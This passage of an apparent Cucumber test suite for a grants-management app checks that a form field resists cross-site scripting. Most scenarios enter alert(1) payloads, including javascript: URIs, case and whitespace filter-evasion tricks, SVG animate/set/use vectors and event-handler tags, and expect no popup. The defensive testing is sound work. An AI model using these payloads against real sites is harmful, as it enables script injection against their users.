      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300964 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | <xss class=progress-bar-animated onanimationstart=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300965 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                   | Field                |
      | <xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300968 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | <iframe src="javascript:alert(1)"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300971 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                               | Field                |
      | <object data="javascript:alert(1)"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300972 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <embed src="javascript:alert(1)"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300973 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                 | Field                |
      | <a href="javascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300975 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                 | Field                |
      | <a href="JaVaScript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300976 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <a href=" 	javascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300982 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                  | Field                |
      | <a href="javas	cript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301005 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <a href="javascript  :alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301009 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                       | Field                |
      | <svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301011 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                  | Field                |
      | <svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301012 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                     | Field                |
      | <svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301014 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                 | Field                |
      | <svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301016 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                 | Field                |
      | <script src="data:text/javascript,alert(1)"></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301017 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <svg><script href="data:text/javascript,alert(1)" /> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301018 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                             | Field                |
      | <svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301019 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
